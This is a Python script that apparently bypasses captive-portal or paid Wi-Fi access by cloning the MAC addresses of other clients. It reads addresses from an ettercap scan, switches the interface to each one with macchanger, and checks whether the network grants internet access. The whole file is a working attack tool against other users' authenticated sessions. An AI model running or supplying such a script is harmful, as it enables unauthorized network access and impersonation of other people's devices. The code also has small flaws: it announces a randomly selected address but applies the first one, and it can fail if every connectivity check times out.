import random
import subprocess
import sys
import time


def waitForAndCheckInternet(wait=20):
    # for now we just keep trying curl until it doesn't fail somehow
    # assume we're OK if we don't get a redirect
    # TODO: refactor to use udev
    # TODO: sometimes association hangs and this can cause a false negative
    increment = 0.5
    while wait > 0:
        try:
            result = subprocess.run(('curl', '-I', 'neverssl.com'), stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=6)
            if result.returncode == 0:
                break
            wait -= increment
            time.sleep(increment)
        except:
            # curl timed out? try again
            pass
    return result.stdout[:15] == b'HTTP/1.0 200 OK'

def setMac(mac):
    subprocess.run(('service', 'network-manager', 'stop'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(('macchanger', '-m', mac, iface), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(('service', 'network-manager', 'start'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run(candidates, keepGoing=False):
    valid = []
    total = len(candidates)
    for idx, mac in enumerate(candidates):
        print("Attempt {}/{} ({})".format(idx+1, total, mac))
        setMac(mac)
        success = waitForAndCheckInternet()
        if success:
            print("    SUCCESS!")
            valid.append(mac)
            if not keepGoing:
                break
    if len(valid):
        print("\nMACs which have access to the Internet:")
        for mac in valid:
            print(mac)
        selected = valid[int(random.random() * len(valid))]
        print("\nUsing: {}".format(selected))
        setMac(valid[0])

# for now, hardcode these values
keepGoing = True
iface = 'wlp58s0'

# for now, read hosts file from ettercap host scan output
with open('/tmp/hosts') as file:
    macs = []
    lines = file.readlines()
    for entry in lines:
        parts = entry.split()
        macs.append(parts[1])
    # run in reverse, and skip the last (originally first) two since these tend to be the gateway stuff
    run(macs[:1:-1], keepGoing=keepGoing)
